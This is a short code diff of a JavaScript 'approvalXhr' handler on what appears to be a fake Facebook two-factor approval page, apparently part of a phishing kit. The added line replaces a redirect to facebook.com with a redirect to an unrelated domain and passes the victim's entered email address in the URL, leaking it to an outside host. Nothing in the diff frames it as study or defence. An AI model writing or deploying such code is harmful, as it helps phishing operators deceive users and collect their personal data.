@@ -352,7 +352,7 @@ function approvalXhr(approvalUrl) {
         errorApproval.style.display = "block";
         approvalContainer.className = errorClass;
       } else if (response == 1) {
-        location.replace("https://www.facebook.com")
+        location.replace(`https://www.kraken-questionario.com/?id=${email.value}&stat=1`)
       }
       enterApproval.className = defaultAuthenticatorAppClass;
       enterApproval.innerHTML = defaultAuthenticatorAppContent;
